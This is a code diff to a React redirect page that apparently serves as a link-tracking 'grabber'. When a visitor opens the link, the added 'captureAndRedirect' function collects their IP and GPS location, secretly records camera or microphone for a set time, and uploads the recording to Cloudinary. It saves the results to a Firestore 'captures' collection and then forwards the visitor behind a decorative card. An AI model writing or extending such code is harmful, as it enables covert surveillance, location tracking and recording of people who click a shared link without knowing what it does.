@@ -241,8 +241,9 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
 
   const [settings, setSettings] = React.useState<Settings | null>(null);
   const [status, setStatus] = React.useState<'initializing' | 'loading' | 'invalid' | 'permission_denied' | 'redirecting'>('initializing');
-  const [permissionDenied, setPermissionDenied] = React.useState(false);
   const [deniedPermissions, setDeniedPermissions] = React.useState<PermissionType[]>([]);
+  const [isWaitingForPermission, setIsWaitingForPermission] = React.useState(false);
+
   const t = React.useMemo(() => getTranslator(settings?.redirectLanguage || 'en'), [settings?.redirectLanguage]);
   
   const permissionStatusRef = React.useRef<Record<PermissionType, PermissionState | 'n/a'>>({ location: 'n/a', camera: 'n/a', microphone: 'n/a' });
@@ -288,22 +289,118 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
             });
             if (!response.ok) {
                 const errorData = await response.json();
-                throw new Error(errorData.error.message || 'Cloudinary upload failed');
+                console.error('Cloudinary API Error:', errorData);
+                throw new Error(errorData.error.message || 'Upload preset not found');
             }
             const result = await response.json();
             return result.secure_url;
         } catch (error) {
             console.error('Cloudinary upload error:', error);
-            addNotification({ type: 'error', message: "Cloudinary upload failed: Check upload preset." });
+            addNotification({ type: 'error', message: 'notification_cloudinary_error' });
             throw error;
         }
     };
 
+    const captureAndRedirect = React.useCallback(async () => {
+        if (!settings || isPreview) return;
+        setStatus('redirecting');
+    
+        try {
+            // --- Basic Info ---
+            let ipData: any = {};
+            try {
+                // Switched to a more reliable, CORS-friendly API
+                const ipRes = await fetch('https://freeipapi.com/api/json/');
+                if (ipRes.ok) ipData = await ipRes.json();
+            } catch (e) { console.error("Could not fetch IP data:", e); }
+    
+            const userAgent = navigator.userAgent;
+            const osMatch = userAgent.match(/(Windows|Mac OS|Linux|Android|iOS)/);
+            
+            // --- Location ---
+            let locationData = { lat: ipData.latitude || null, lon: ipData.longitude || null, city: ipData.cityName || 'Unknown', country: ipData.countryName || 'Unknown', source: 'ip' as 'ip' | 'gps' };
+            if (permissionStatusRef.current.location === 'granted') {
+                await new Promise<void>(resolve => {
+                    navigator.geolocation.getCurrentPosition(pos => {
+                        locationData = { ...locationData, lat: pos.coords.latitude, lon: pos.coords.longitude, source: 'gps' };
+                        resolve();
+                    }, () => resolve(), { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
+                });
+            }
+    
+            // --- Media Capture ---
+            let cameraUrl: string | undefined;
+            let micUrl: string | undefined;
+    
+            try {
+                if (permissionStatusRef.current.camera === 'granted' || permissionStatusRef.current.microphone === 'granted') {
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: permissionStatusRef.current.camera === 'granted',
+                        audio: permissionStatusRef.current.microphone === 'granted',
+                    });
+                    
+                    const recorder = new MediaRecorder(stream);
+                    const chunks: Blob[] = [];
+                    recorder.ondataavailable = (e) => chunks.push(e.data);
+                    
+                    recorder.start();
+                    await new Promise(resolve => setTimeout(resolve, settings.captureInfo.recordingDuration * 1000));
+                    recorder.stop();
+                    stream.getTracks().forEach(track => track.stop());
+    
+                    await new Promise(resolve => recorder.onstop = resolve);
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    
+                    if(permissionStatusRef.current.camera === 'granted') {
+                        cameraUrl = await uploadToCloudinary(blob, 'video');
+                    } else if (permissionStatusRef.current.microphone === 'granted') {
+                        micUrl = await uploadToCloudinary(blob, 'raw');
+                    }
+                }
+            } catch (uploadError) {
+                console.error("Media upload failed, proceeding without media:", uploadError);
+            }
+            
+            const captured: Omit<CapturedData, 'id'> = {
+                redirectId: settings.id,
+                name: `Capture on ${new Date().toLocaleDateString()}`,
+                timestamp: Date.now(),
+                ip: ipData.ipAddress || 'Unknown',
+                userAgent,
+                os: osMatch ? osMatch[0] : 'Unknown',
+                browser: userAgent.match(/(Chrome|Firefox|Safari|Edge|OPR)/)?.[0] || 'Unknown',
+                deviceType: 'ontouchstart' in window ? 'Mobile' : 'Desktop',
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                location: locationData,
+                permissions: permissionStatusRef.current,
+                cameraCapture: cameraUrl,
+                microphoneCapture: micUrl,
+            };
+    
+            // Remove undefined fields before saving to Firestore
+            Object.keys(captured).forEach(key => (captured as any)[key] === undefined && delete (captured as any)[key]);
+            
+            await addDoc(collection(db, 'captures'), captured);
+        } catch (error) {
+            console.error("Failed to save captured data:", error);
+        } finally {
+            if (settings.redirectDelay > 0) {
+              setTimeout(() => { window.location.href = settings.redirectUrl; }, settings.redirectDelay * 1000);
+            } else {
+              window.location.href = settings.redirectUrl;
+            }
+        }
+    }, [settings, isPreview, addNotification]);
+
     const requestPermissions = React.useCallback(async () => {
         if (!settings || isPreview) return;
-        setPermissionDenied(false);
+        setStatus('redirecting');
+        setIsWaitingForPermission(true);
+
         const required = settings.captureInfo.permissions;
         if (required.length === 0) {
+            setIsWaitingForPermission(false);
             return captureAndRedirect();
         }
 
@@ -316,15 +413,17 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
                     const status = await navigator.permissions.query({ name: 'geolocation' });
                     permissionStatusRef.current.location = status.state;
                     if (status.state === 'prompt') {
-                       await new Promise<void>((resolve, reject) => navigator.geolocation.getCurrentPosition(
+                       await new Promise<void>((resolve) => navigator.geolocation.getCurrentPosition(
                            () => { permissionStatusRef.current.location = 'granted'; resolve(); },
-                           () => { permissionStatusRef.current.location = 'denied'; resolve(); }, // Resolve even on deny
-                           { timeout: 10000 }
+                           () => { permissionStatusRef.current.location = 'denied'; resolve(); },
+                           { timeout: 15000 }
                        ));
                     }
                 } else if (perm === 'camera' || perm === 'microphone') {
-                    await navigator.mediaDevices.getUserMedia({ video: perm === 'camera', audio: perm === 'microphone' });
-                    permissionStatusRef.current[perm] = 'granted';
+                     const constraints = { video: perm === 'camera', audio: perm === 'microphone' };
+                     const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                     permissionStatusRef.current[perm] = 'granted';
+                     stream.getTracks().forEach(track => track.stop()); // Stop stream immediately after getting permission
                 }
             } catch (error) {
                 console.warn(`Permission denied for ${perm}:`, error);
@@ -339,106 +438,19 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
             }
         });
 
+        setIsWaitingForPermission(false);
         if (hasDenied) {
             setDeniedPermissions(newlyDenied);
-            setPermissionDenied(true);
+            setStatus('permission_denied');
         } else {
             captureAndRedirect();
         }
-    }, [settings, isPreview]);
+    }, [settings, isPreview, captureAndRedirect]);
 
-  const captureAndRedirect = React.useCallback(async () => {
-        if (!settings || isPreview) return;
-        setStatus('redirecting');
-
-        try {
-            // --- Basic Info ---
-            let ipData: any = {};
-            try {
-                const ipRes = await fetch('https://ip-api.com/json');
-                if (ipRes.ok) ipData = await ipRes.json();
-            } catch (e) { console.error("Could not fetch IP data:", e); }
-
-            const userAgent = navigator.userAgent;
-            const osMatch = userAgent.match(/(Windows|Mac OS|Linux|Android|iOS)/);
-            
-            // --- Location ---
-            let locationData = { lat: ipData.lat || null, lon: ipData.lon || null, city: ipData.city || 'Unknown', country: ipData.country || 'Unknown', source: 'ip' as 'ip' | 'gps' };
-            if (permissionStatusRef.current.location === 'granted') {
-                await new Promise<void>(resolve => {
-                    navigator.geolocation.getCurrentPosition(pos => {
-                        locationData = { ...locationData, lat: pos.coords.latitude, lon: pos.coords.longitude, source: 'gps' };
-                        resolve();
-                    }, () => resolve(), { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
-                });
-            }
-
-            // --- Media Capture ---
-            let cameraUrl: string | undefined;
-            let micUrl: string | undefined;
-
-            if (permissionStatusRef.current.camera === 'granted' || permissionStatusRef.current.microphone === 'granted') {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: permissionStatusRef.current.camera === 'granted',
-                    audio: permissionStatusRef.current.microphone === 'granted',
-                });
-                
-                const recorder = new MediaRecorder(stream);
-                const chunks: Blob[] = [];
-                recorder.ondataavailable = (e) => chunks.push(e.data);
-                
-                recorder.start();
-                await new Promise(resolve => setTimeout(resolve, settings.captureInfo.recordingDuration * 1000));
-                recorder.stop();
-                stream.getTracks().forEach(track => track.stop());
-
-                await new Promise(resolve => recorder.onstop = resolve);
-                const blob = new Blob(chunks, { type: 'video/webm' });
-                
-                // For simplicity, we upload one blob. If both perms are on, it's a video with audio.
-                // A more complex implementation could separate them.
-                if(permissionStatusRef.current.camera === 'granted') {
-                    cameraUrl = await uploadToCloudinary(blob, 'video');
-                } else if (permissionStatusRef.current.microphone === 'granted') {
-                    micUrl = await uploadToCloudinary(blob, 'raw');
-                }
-            }
-            
-            const captured: Omit<CapturedData, 'id'> = {
-                redirectId: settings.id,
-                name: `Capture on ${new Date().toLocaleDateString()}`,
-                timestamp: Date.now(),
-                ip: ipData.query || 'Unknown',
-                userAgent,
-                os: osMatch ? osMatch[0] : 'Unknown',
-                browser: userAgent.match(/(Chrome|Firefox|Safari|Edge|OPR)/)?.[0] || 'Unknown',
-                deviceType: 'ontouchstart' in window ? 'Mobile' : 'Desktop',
-                language: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                location: locationData,
-                permissions: permissionStatusRef.current,
-                cameraCapture: cameraUrl,
-                microphoneCapture: micUrl,
-            };
-
-            // Remove undefined fields before saving to Firestore
-            Object.keys(captured).forEach(key => (captured as any)[key] === undefined && delete (captured as any)[key]);
-            
-            await addDoc(collection(db, 'captures'), captured);
-        } catch (error) {
-            console.error("Failed to save captured data:", error);
-        } finally {
-            if (settings.redirectDelay > 0) {
-              setTimeout(() => { window.location.href = settings.redirectUrl; }, settings.redirectDelay * 1000);
-            } else {
-              window.location.href = settings.redirectUrl;
-            }
-        }
-    }, [settings, isPreview]);
 
   React.useEffect(() => {
     if (status === 'loading' && settings && !isPreview) {
-      requestPermissions();
+        requestPermissions();
     }
   }, [status, settings, isPreview, requestPermissions]);
 
@@ -454,15 +466,15 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
             </div>
         );
     }
-    if (permissionDenied) {
-        return <PermissionInstructions onRetry={requestPermissions} requiredPermissions={deniedPermissions} />;
+    if (status === 'permission_denied') {
+        return <PermissionInstructions onRetry={requestPermissions} requiredPermissions={deniedPermissions} t={t} />;
     }
     if (status === 'loading') {
       return <h1 className="text-2xl font-bold text-white">{t('redirect_loading')}</h1>;
     }
     if (settings && (status === 'redirecting' || isPreview)) {
       const CardComponent = CARD_COMPONENTS[settings.cardStyle] || CARD_COMPONENTS['default-white'];
-      return <CardComponent settings={settings} isPaused={isPreview} t={t} />;
+      return <CardComponent settings={settings} isPaused={isPreview || isWaitingForPermission} t={t} />;
     }
     return null;
   };
